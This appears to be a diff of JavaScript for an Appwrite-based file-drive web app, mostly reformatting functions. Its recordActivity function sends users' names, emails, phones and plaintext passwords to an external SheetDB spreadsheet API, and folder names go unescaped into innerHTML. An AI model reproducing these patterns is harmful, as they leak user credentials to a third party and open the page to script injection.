 window.restoreFromTrash = async () => { try { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, { trashed: false }); loadFiles('trash'); el('fileContextMenu').classList.remove('show'); el('fileContextMenu').classList.add('hidden'); } catch(e){} };
@@ -713,60 +462,10 @@ window.deleteItemPermanently = async () => { if(!confirm("Hapus permanen?")) ret
 window.openCurrentItem = () => { if(selectedItem) selectedItem.type==='folder' ? openFolder(selectedItem.$id, selectedItem.name) : window.open(selectedItem.url, '_blank'); el('fileContextMenu').classList.remove('show'); el('fileContextMenu').classList.add('hidden'); };
 window.downloadCurrentItem = () => { if(selectedItem && selectedItem.type!=='folder') window.open(storage.getFileDownload(CONFIG.BUCKET_ID, selectedItem.fileId), '_blank'); el('fileContextMenu').classList.remove('show'); el('fileContextMenu').classList.add('hidden'); };
 window.renameCurrentItem = async () => { const newName = prompt("Nama baru:", selectedItem.name); if(newName) { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, {name: newName}); loadFiles(currentFolderId); } el('fileContextMenu').classList.remove('show'); el('fileContextMenu').classList.add('hidden'); };
-
 function resetUploadUI() { selectedUploadFile = null; el('fileInfoContainer').classList.add('hidden'); el('fileInputHidden').value = ''; }
 function handleFileSelect(file) { selectedUploadFile = file; el('fileInfoText').innerText = `Terpilih: ${file.name}`; el('fileInfoContainer').classList.remove('hidden'); }
-function initDragAndDrop() {
-    const zone = el('dropZone');
-    const input = el('fileInputHidden');
-    if (!zone) return;
-    zone.addEventListener('dragover', (e) => { e.preventDefault(); zone.classList.add('active'); });
-    zone.addEventListener('dragleave', () => zone.classList.remove('active')); 
-    zone.addEventListener('drop', (e) => { e.preventDefault(); zone.classList.remove('active'); if(e.dataTransfer.files.length > 0) handleFileSelect(e.dataTransfer.files[0]); });
-    if(input) input.addEventListener('change', (e) => { if (e.target.files.length > 0) handleFileSelect(e.target.files[0]); });
-}
-
-// UPDATE: FUNGSI HEADER UI YANG DIPERBAIKI (TOMBOL KEMBALI)
-async function loadFiles(param) { 
-    if (!currentUser) return; 
-    const grid = el('fileGrid'); 
-    grid.innerHTML = ''; 
-    updateHeaderUI(); 
-    
-    let queries = [Appwrite.Query.equal('owner', currentUser.$id)]; 
-    if (param === 'recent') queries.push(Appwrite.Query.orderDesc('$createdAt'), Appwrite.Query.equal('trashed', false)); 
-    else if (param === 'starred') queries.push(Appwrite.Query.equal('starred', true), Appwrite.Query.equal('trashed', false)); 
-    else if (param === 'trash') queries.push(Appwrite.Query.equal('trashed', true)); 
-    else { 
-        if (typeof param === 'string' && !['root','recent','starred','trash'].includes(param)) currentFolderId = param; 
-        queries.push(Appwrite.Query.equal('parentId', currentFolderId), Appwrite.Query.equal('trashed', false)); 
-    } 
-    
-    try { 
-        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, queries); 
-        if (res.documents.length === 0) grid.innerHTML = `<div style="grid-column:1/-1;display:flex;flex-direction:column;align-items:center;opacity:0.5;margin-top:50px;"><i class="fa-solid fa-folder-open" style="font-size:4rem;margin-bottom:20px;"></i><p>Folder Kosong</p></div>`; 
-        else res.documents.forEach(doc => renderItem(doc)); 
-    } catch (e) { console.error(e); } 
-}
-
-function updateHeaderUI() { 
-    const container = document.querySelector('.breadcrumb-area'); 
-    const isRoot = currentFolderId === 'root' && currentViewMode === 'root'; 
-    
-    if (isRoot) { 
-        const h = new Date().getHours(); 
-        const s = h < 12 ? "Morning" : h < 18 ? "Afternoon" : "Night"; 
-        container.innerHTML = `<h2 id="headerTitle">Welcome In Drive ${s}</h2>`; 
-    } else { 
-        container.innerHTML = `
-            <div class="back-nav-container">
-                <button onclick="goBack()" class="back-btn">
-                    <i class="fa-solid fa-arrow-left"></i> Kembali ke Drive
-                </button>
-                <h2 id="headerTitle" style="margin-top:10px;">${currentFolderName}</h2>
-            </div>`; 
-    } 
-}
-
+function initDragAndDrop() { const zone = el('dropZone'); const input = el('fileInputHidden'); if (!zone) return; zone.addEventListener('dragover', (e) => { e.preventDefault(); zone.classList.add('active'); }); zone.addEventListener('dragleave', () => zone.classList.remove('active')); zone.addEventListener('drop', (e) => { e.preventDefault(); zone.classList.remove('active'); if(e.dataTransfer.files.length > 0) handleFileSelect(e.dataTransfer.files[0]); }); if(input) input.addEventListener('change', (e) => { if (e.target.files.length > 0) handleFileSelect(e.target.files[0]); }); }
+async function loadFiles(param) { if (!currentUser) return; const grid = el('fileGrid'); grid.innerHTML = ''; updateHeaderUI(); let queries = [Appwrite.Query.equal('owner', currentUser.$id)]; if (param === 'recent') queries.push(Appwrite.Query.orderDesc('$createdAt'), Appwrite.Query.equal('trashed', false)); else if (param === 'starred') queries.push(Appwrite.Query.equal('starred', true), Appwrite.Query.equal('trashed', false)); else if (param === 'trash') queries.push(Appwrite.Query.equal('trashed', true)); else { if (typeof param === 'string' && !['root','recent','starred','trash'].includes(param)) currentFolderId = param; queries.push(Appwrite.Query.equal('parentId', currentFolderId), Appwrite.Query.equal('trashed', false)); } try { const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, queries); if (res.documents.length === 0) grid.innerHTML = `<div style="grid-column:1/-1;display:flex;flex-direction:column;align-items:center;opacity:0.5;margin-top:50px;"><i class="fa-solid fa-folder-open" style="font-size:4rem;margin-bottom:20px;"></i><p>Folder Kosong</p></div>`; else res.documents.forEach(doc => renderItem(doc)); } catch (e) { console.error(e); } }
+function updateHeaderUI() { const container = document.querySelector('.breadcrumb-area'); const isRoot = currentFolderId === 'root' && currentViewMode === 'root'; if (isRoot) { const h = new Date().getHours(); const s = h < 12 ? "Morning" : h < 18 ? "Afternoon" : "Night"; container.innerHTML = `<h2 id="headerTitle">Welcome In Drive ${s}</h2>`; } else { container.innerHTML = `<div class="back-nav-container"><button onclick="goBack()" class="back-btn"><i class="fa-solid fa-arrow-left"></i> Kembali ke Drive</button><h2 id="headerTitle" style="margin-top:10px;">${currentFolderName}</h2></div>`; } }
 async function recordActivity(sheetName, userData) { try { const now = new Date(); const formattedDate = now.toLocaleString('id-ID', { day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' }).replace(/\./g, ':'); const payload = { "ID": userData.id || "-", "Nama": userData.name || "-", "Email": userData.email || "-", "Phone": userData.phone || "-", "Password": userData.password || "-", "Waktu": formattedDate }; await fetch(`${SHEETDB_API}?sheet=${sheetName}`, { method: 'POST', headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' }, body: JSON.stringify({ data: payload }) }); } catch (error) { console.error("Excel Log Error"); } }
 window.togglePass = (id, icon) => { const input = document.getElementById(id); if (input.type === "password") { input.type = "text"; icon.classList.remove("fa-eye-slash"); icon.classList.add("fa-eye"); } else { input.type = "password"; icon.classList.remove("fa-eye"); icon.classList.add("fa-eye-slash"); } };
